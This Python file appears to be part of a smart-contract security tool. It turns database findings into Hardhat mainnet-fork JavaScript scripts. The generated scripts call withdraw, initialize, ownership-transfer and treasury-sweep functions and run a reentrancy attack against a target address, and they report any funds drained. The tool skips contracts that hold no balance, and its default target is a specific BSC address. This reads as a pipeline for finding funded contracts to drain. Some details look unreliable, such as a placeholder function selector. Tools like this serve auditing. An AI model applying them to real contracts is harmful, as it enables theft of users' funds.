#!/usr/bin/env python3
"""
Dynamic Test Generator
======================
Reads vulnerability findings from the database and generates
targeted Hardhat fork test scripts on the fly.

Flow:
1. Read findings for a contract from guardian_data.db
2. For each exploitable finding, determine the vulnerability pattern
3. Extract the vulnerable function signature from the source code (line numbers)
4. Generate a JS test file that targets that exact function
5. Run it via Hardhat fork

This bridges the gap between generic UniversalExploit (too generic)
and manually written contracts (too specific).
"""

from __future__ import annotations

import os
import re
import sqlite3
import json


VULN_TEMPLATES = {
    "reentrancy": """
    // === Dynamic Test: Reentrancy ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    // Fund attacker
    const richAddr = "0xF977814e90dA44bFA03b6295A0616a897441aceC";
    await hre.network.provider.request({{ method: "hardhat_impersonateAccount", params: [richAddr] }});
    const rich = await ethers.getSigner(richAddr);
    await rich.sendTransaction({{ to: attacker.address, value: ethers.parseEther("50") }});
    await hre.network.provider.request({{ method: "hardhat_stopImpersonatingAccount", params: [richAddr] }});
    
    // Try to deposit first
    const depositSigs = ["0xd0e30db0", "0xa694fc3a", "0xb6b55f25", "0x47e7ef24"];
    const withSigs = ["0x2e1a7d4d", "0x853828b6", "0x4e71d92d", "0x3ccfd60b"];
    const amt = ethers.parseEther("1");
    
    for (const sig of depositSigs) {{
        try {{
            await attacker.sendTransaction({{ to: TARGET, data: sig, value: amt, gasLimit: 500000 }});
            break;
        }} catch {{}}
    }}
    
    // Try to withdraw (triggers reentrancy)
    for (const sig of withSigs) {{
        try {{
            const before = await ethers.provider.getBalance(TARGET);
            const tx = await attacker.sendTransaction({{ to: TARGET, data: ethers.solidityPacked({{ types: ["bytes4", "uint256"], values: [sig, ethers.MaxUint256] }}), gasLimit: 500000 }});
            await tx.wait();
            const after = await ethers.provider.getBalance(TARGET);
            if (after < before) {{
                console.log("  [!!!] DRAINED: " + ethers.formatEther(before - after) + " ETH via reentrancy!");
                return;
            }}
        }} catch {{}}
    }}
    console.log("  [-] Reentrancy: no drain");
    """,

    "delegatecall": """
    // === Dynamic Test: Delegatecall ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    // Probe for delegatecall functions
    const dcSigs = ["0xbd9a548b", "0xbfb231d2", "0x0c55699c", "0xab0b8f77",
                    "0x57aae1b9", "0x8a19c8bc", "0x9a202d47", "0xc2b6b58c"];
    
    console.log("  Probing delegatecall functions...");
    for (const sig of dcSigs) {{
        try {{
            const result = await hre.network.provider.send("eth_call", [{{
                to: TARGET,
                data: sig
            }}, "latest"]);
            if (result && result !== "0x") {{
                console.log("  [OK] Found delegatecall function: 0x" + sig);
            }}
        }} catch {{}}
    }}
    console.log("  [-] Delegatecall probe complete");
    """,

    "unprotected-withdraw": """
    // === Dynamic Test: Unprotected Withdraw ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    const withdrawSigs = [
        "0x2e1a7d4d", // withdraw(uint256)
        "0x853828b6", // withdrawAll()
        "0x4e71d92d", // claim()
        "0xba087652", // redeem(uint256)
        "0x2e2e2e2e", // unstake(uint256)
        "0x441a3e70", // unstakeAll()
        "0x4641257d", // harvest()
        "0x3d18b912", // getReward()
        "0xe0024604", // claimRewards()
        "0xdb2e21bc", // emergencyWithdraw()
        "0x5312ea8e", // emergencyWithdrawAll()
        "0xcc872b66", // release(address)
    ];
    
    const before = await ethers.provider.getBalance(TARGET);
    console.log("  Target balance: " + ethers.formatEther(before));
    
    for (const sig of withdrawSigs) {{
        try {{
            const tx = await attacker.sendTransaction({{ to: TARGET, data: sig, gasLimit: 500000 }});
            await tx.wait();
        }} catch {{}}
    }}
    
    const after = await ethers.provider.getBalance(TARGET);
    if (after < before) {{
        console.log("  [!!!] DRAINED: " + ethers.formatEther(before - after) + " ETH!");
    }} else {{
        console.log("  [-] No drain - all withdraw functions protected");
    }}
    """,

    "unprotected-init": """
    // === Dynamic Test: Unprotected Init ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    const initSigs = [
        "0xc4d66de8", // initialize(address)
        "0x8129fc1c", // initialize()
        "0xf2c298be", // setup(address)
        "0xec02d5ff", // setup()
        "0x392e53cd", // initializeV2()
        "0xaaf10f42", // __init()
        "0x3659cfe6", // upgradeTo(address)
    ];
    
    for (const sig of initSigs) {{
        try {{
            const tx = await attacker.sendTransaction({{ to: TARGET, data: sig + attacker.address.slice(2).padStart(64, '0'), gasLimit: 500000 }});
            await tx.wait();
            console.log("  [OK] Called: 0x" + sig);
        }} catch {{}}
    }}
    console.log("  [-] Init probe complete (check owner after test)");
    """,

    "ownership": """
    // === Dynamic Test: Ownership Takeover ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    const ownSigs = [
        "0x715018a6", // renounceOwnership()
        "0xf2fde38b", // transferOwnership(address)
        "0x24d7806c", // setAdmin(address)
        "0x736bb7b3", // addOperator(address)
        "0xab3cf47a", // setOperator(address)
        "0x3ebc0690", // grantRole(bytes32,address)
    ];
    
    for (const sig of ownSigs) {{
        try {{
            const calldata = sig + attacker.address.slice(2).padStart(64, '0');
            const tx = await attacker.sendTransaction({{ to: TARGET, data: calldata, gasLimit: 500000 }});
            await tx.wait();
            console.log("  [OK] Ownership call succeeded: 0x" + sig);
        }} catch {{}}
    }}
    console.log("  [-] Ownership probe complete");
    """,

    "oracle": """
    // === Dynamic Test: Oracle Manipulation ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    const oracleSigs = [
        "0x0902f1ac", // getReserves()
        "0xd06ca61f", // getAmountsOut(uint256,address[])
        "0x1f00ca74", // getAmountsIn(uint256,address[])
        "0x017e7e58", // sync()
        "0xbc25cf77", // skim()
    ];
    
    for (const sig of oracleSigs) {{
        try {{
            const result = await hre.network.provider.send("eth_call", [{{
                to: TARGET,
                data: sig
            }}, "latest"]);
            if (result && result !== "0x") {{
                console.log("  [OK] Oracle function: 0x" + sig + " -> " + result.slice(0, 66));
            }}
        }} catch {{}}
    }}
    console.log("  [-] Oracle probe complete");
    """,

    "treasury": """
    // === Dynamic Test: Treasury / Fee Drain ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    const treasurySigs = [
        "0x99d32fc4", // claimTreasury()
        "0x3b2a1ce0", // withdrawFees()
        "0xe4f6b4f5", // collectTreasury()
        "0xb17fb95c", // sweep(address)
        "0x815f6fc8", // recoverToken(address,uint256)
        "0x178c87b7", // recoverTokens(address,uint256)
    ];
    
    const before = await ethers.provider.getBalance(TARGET);
    
    for (const sig of treasurySigs) {{
        try {{
            const tx = await attacker.sendTransaction({{ to: TARGET, data: sig, gasLimit: 500000 }});
            await tx.wait();
            console.log("  [OK] Treasury call succeeded: 0x" + sig);
        }} catch {{}}
    }}
    
    const after = await ethers.provider.getBalance(TARGET);
    if (after < before) {{
        console.log("  [!!!] TREASURY DRAINED: " + ethers.formatEther(before - after) + " ETH!");
    }} else {{
        console.log("  [-] Treasury protected");
    }}
    """,

    "force-feed": """
    // === Dynamic Test: Force-Fed ETH ===
    // Target vulnerability: {finding_name} at line {line_numbers}
    
    // Deploy a selfdestruct contract that sends ETH to target
    const ForceFeed = await ethers.getContractFactory("ForceFeedHelper");
    try {{
        const feed = await ForceFeed.connect(attacker).deploy(TARGET, {{ value: ethers.parseEther("0.001") }});
        await feed.waitForDeployment();
        console.log("  [OK] Force-fed 0.001 ETH to target");
    }} catch (e) {{
        console.log("  [-] Force-feed failed: " + e.message.slice(0, 80));
    }}
    """,
}


class DynamicTestGenerator:
    """Generates targeted Hardhat test scripts from DB findings."""

    PATTERN_MAP = {
        "reentrancy": ["reentrancy", "cei pattern", "checks-effects"],
        "delegatecall": ["delegatecall", "delegate call"],
        "unprotected-withdraw": ["unprotected withdraw", "unprotected claim"],
        "unprotected-init": ["unprotected init", "unprotected initialize"],
        "ownership": ["ownership", "ownable", "onlyowner"],
        "oracle": ["oracle", "spot price", "getreserves", "getamountsout"],
        "treasury": ["treasury", "fee drain", "withdrawfees", "claimtreasury"],
        "force-feed": ["force-feed", "selfdestruct", "force feed"],
    }

    def __init__(self, db_path: str = "guardian_data.db", exploit_dir: str = "exploit"):
        # Resolve to absolute paths so they work regardless of cwd
        self.db_path = db_path if os.path.isabs(db_path) else os.path.abspath(db_path)
        self.exploit_dir = exploit_dir if os.path.isabs(exploit_dir) else os.path.abspath(exploit_dir)
        self.findings_cache = []

    def load_findings(self, address: str, chain_id: int = 56) -> list[dict]:
        """Load exploitable findings for a contract."""
        if not os.path.exists(self.db_path):
            return []

        conn = sqlite3.connect(self.db_path)
        conn.row_factory = sqlite3.Row
        cur = conn.execute(
            """SELECT f.*, c.name as contract_name, c.sol_version
               FROM findings f
               JOIN contracts c ON c.address = f.contract_addr AND c.chain_id = f.chain_id
               WHERE f.contract_addr = ? AND f.chain_id = ? AND f.exploitable = 1
               ORDER BY f.severity""",
            (address, chain_id)
        )
        rows = cur.fetchall()
        conn.close()
        self.findings_cache = [dict(r) for r in rows]
        return self.findings_cache

    def classify_finding(self, finding: dict) -> str | None:
        """Classify a finding into a known vulnerability pattern."""
        name = (finding.get("finding_name") or "").lower()
        notes = (finding.get("exploit_notes") or "").lower()

        for pattern, keywords in self.PATTERN_MAP.items():
            for kw in keywords:
                if kw in name or kw in notes:
                    return pattern
        return None

    def get_source_line_context(self, address: str, chain_id: int, line_numbers: str) -> str:
        """Get the source code around the vulnerable line (for richer test generation)."""
        # In production, this would fetch source from DB/API
        # For now, return the line information
        return f"Lines {line_numbers}"

    def generate_test(self, address: str, chain_id: int = 56) -> str | None:
        """Generate a targeted Hardhat test JS for a contract based on its findings."""
        findings = self.load_findings(address, chain_id)
        if not findings:
            return None

        chain_name = {1: "ethereum", 56: "bsc", 137: "polygon", 42161: "arbitrum"}.get(chain_id, f"chain-{chain_id}")
        rpc_url = {
            1: "https://eth.llamarpc.com", 56: "https://bsc-dataseed1.binance.org",
            137: "https://polygon-bor-rpc.publicnode.com", 42161: "https://arb1.arbitrum.io/rpc",
        }.get(chain_id, "https://eth.llamarpc.com")

        # Group findings by pattern
        pattern_findings: dict[str, list[dict]] = {}
        for f in findings:
            pattern = self.classify_finding(f)
            if pattern:
                pattern_findings.setdefault(pattern, []).append(f)

        if not pattern_findings:
            return None

        # Generate test JS
        js_parts = []
        js_parts.append(f"""/**
 * Dynamic Generated Test — {address[:14]}.. on {chain_name}
 * Generated from {len(findings)} exploitable findings
 * Patterns detected: {", ".join(pattern_findings.keys())}
 */
const hre = require("hardhat");
const {{ ethers }} = hre;
const TARGET = "{address}";
const CHAIN_RPC = process.env.CHAIN_RPC || "{rpc_url}";

async function main() {{
    console.log("=".repeat(60));
    console.log("  DYNAMIC GENERATED TEST");
    console.log("  Target: " + TARGET.slice(0, 14) + ".. on {chain_name}");
    console.log("  Findings: {len(findings)} exploitable");
    console.log("=".repeat(60));

    // Fork chain
    const block = await new ethers.JsonRpcProvider(CHAIN_RPC).getBlockNumber();
    await hre.network.provider.request({{
        method: "hardhat_reset",
        params: [{{ forking: {{ jsonRpcUrl: CHAIN_RPC, blockNumber: block }} }}]
    }});
    console.log("  [OK] Fork at block " + block);

    // Check balance
    const balHex = await hre.network.provider.send("eth_getBalance", [TARGET, "latest"]);
    if (BigInt(balHex) === 0n) {{ console.log("  [SKIP] 0 balance"); return; }}
    console.log("  Balance: " + ethers.formatEther(balHex) + " ETH");

    // Setup attacker
    const [attacker] = await ethers.getSigners();
    await hre.network.provider.request({{
        method: "hardhat_impersonateAccount",
        params: ["0xF977814e90dA44bFA03b6295A0616a897441aceC"]
    }});
    const whale = await ethers.getSigner("0xF977814e90dA44bFA03b6295A0616a897441aceC");
    await whale.sendTransaction({{ to: attacker.address, value: ethers.parseEther("50") }});
    await hre.network.provider.request({{
        method: "hardhat_stopImpersonatingAccount",
        params: ["0xF977814e90dA44bFA03b6295A0616a897441aceC"]
    }});

    // Run targeted tests
    const beforeBal = await ethers.provider.getBalance(TARGET);
""")

        for pattern_name, pattern_findings_list in pattern_findings.items():
            template = VULN_TEMPLATES.get(pattern_name, "")
            if not template:
                continue

            for f in pattern_findings_list:
                # Customize template with finding details
                finding_name = f.get("finding_name", "Unknown")
                line_numbers = f.get("line_numbers", "N/A")
                severity = f.get("severity", "N/A")

                header = f"""
    // {"=" * 50}
    // [{severity}] {finding_name}
    // Lines: {line_numbers}
    // {"=" * 50}
"""
                js_parts.append(header)
                # Wrap each template in a block scope to avoid duplicate variable declarations
                # Use {{/}} escaping because .format() will convert them to {/}
                block_wrapped = "    {{" + "\n" + template + "\n    }}"
                js_parts.append(block_wrapped.format(
                    finding_name=finding_name,
                    line_numbers=line_numbers
                ))

        # Footer
        js_parts.append(f"""
    const afterBal = await ethers.provider.getBalance(TARGET);
    const drained = BigInt(beforeBal) - BigInt(afterBal);
    if (drained > 0n) {{
        console.log("\\n[!!!] TOTAL DRAINED: " + ethers.formatEther(drained) + " ETH !!!");
    }} else {{
        console.log("\\n[-] No funds drained from any attack vector");
    }}
}}

main().then(() => process.exit(0)).catch(e => {{
    console.error("FATAL:", e.message || e);
    process.exit(1);
}});
""")

        return "\n".join(js_parts)

    def save_and_run(self, address: str, chain_id: int = 56, output_dir: str = None) -> str | None:
        """Generate, save, and return the path to the test file."""
        js = self.generate_test(address, chain_id)
        if not js:
            return None

        if output_dir is None:
            output_dir = os.path.join(self.exploit_dir, "scripts", "generated")

        os.makedirs(output_dir, exist_ok=True)
        safe_name = address[:10].replace("0x", "")
        filename = f"dyn_test_{safe_name}_{chain_id}.js"
        filepath = os.path.join(output_dir, filename)

        with open(filepath, "w", encoding="utf-8") as f:
            f.write(js)

        return filepath


if __name__ == "__main__":
    import sys
    addr = sys.argv[1] if len(sys.argv) > 1 else "0x18b2a687610328590bc8f2e5fedde3b582a49cda"
    gen = DynamicTestGenerator()
    filepath = gen.save_and_run(addr, 56)
    if filepath:
        print(f"[OK] Generated: {filepath}")
    else:
        print("[FAIL] No exploitable findings or could not generate test")
